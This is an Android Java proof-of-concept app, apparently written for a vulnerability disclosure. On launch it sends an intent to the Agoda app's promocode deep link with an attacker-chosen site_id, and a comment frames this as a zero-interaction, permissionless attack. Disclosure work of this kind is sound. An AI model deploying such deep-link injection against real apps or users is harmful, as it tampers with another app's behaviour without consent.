package com.research.zeroclickpoc;

import android.app.Activity;
import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import android.widget.TextView;

/**
 * Minimal, unprivileged demo app. Declares no permissions of its own.
 * Immediately upon being launched (a single tap on this app's own icon,
 * matching the CVSS UI:N model where the victim, Agoda, requires zero
 * interaction), it fires an explicit VIEW intent at Agoda's promocode
 * deep link with an attacker-chosen site_id. This is running entirely
 * under this app's own uid, not adb/shell.
 */
public class MainActivity extends Activity {
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        String siteId = "THIRDPARTYAPP_ZEROCLICK";
        Uri uri = Uri.parse("agoda://promocode/?site_id=" + siteId);
        Intent intent = new Intent(Intent.ACTION_VIEW, uri);
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        startActivity(intent);

        TextView tv = new TextView(this);
        tv.setText("Fired agoda://promocode/?site_id=" + siteId
                + "\nfrom package: " + getPackageName()
                + "\n(this app declares zero permissions)");
        tv.setTextSize(16);
        tv.setPadding(40, 200, 40, 40);
        setContentView(tv);
    }
}
